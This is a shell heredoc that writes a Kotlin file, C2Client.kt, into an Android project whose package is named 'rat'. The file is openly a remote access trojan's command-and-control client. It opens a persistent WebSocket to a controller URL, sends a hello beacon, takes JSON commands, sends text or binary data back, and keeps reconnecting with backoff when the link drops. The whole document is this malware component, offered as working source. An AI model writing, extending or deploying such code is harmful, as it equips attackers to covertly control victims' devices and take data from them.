          cat > app/src/main/java/ai/venice/rat/C2Client.kt <<'EOF'
          package ai.venice.rat
          import kotlinx.coroutines.*
          import okhttp3.*
          import okio.ByteString
          import org.json.JSONObject
          import java.util.concurrent.TimeUnit
          class C2Client(private val url: String, private val hello: () -> JSONObject,
                         private val onMsg: (JSONObject) -> Unit, private val onState: (Boolean, String) -> Unit) {
            private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
            private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
            private var ws: WebSocket? = null
            private var attempt = 0
            fun connect() {
              ws = http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
                override fun onOpen(w: WebSocket, r: Response) { attempt = 0; onState(true, "open"); w.send(hello().toString()) }
                override fun onMessage(w: WebSocket, t: String) { runCatching { onMsg(JSONObject(t)) } }
                override fun onFailure(w: WebSocket, t: Throwable, r: Response?) { onState(false, t.message ?: "fail"); retry() }
                override fun onClosed(w: WebSocket, c: Int, r: String) { onState(false, "closed $c"); retry() }
              })
            }
            private fun retry() {
              if (!scope.isActive) return
              val ms = minOf(60_000L, 1_000L shl minOf(++attempt, 6))
              scope.launch { delay(ms); connect() }
            }
            fun send(s: String) { ws?.send(s) }
            fun sendBin(b: ByteArray) { ws?.send(ByteString.of(*b)) }
            fun close() { runCatching { ws?.close(1000, "bye") }; scope.cancel() }
          }
          EOF

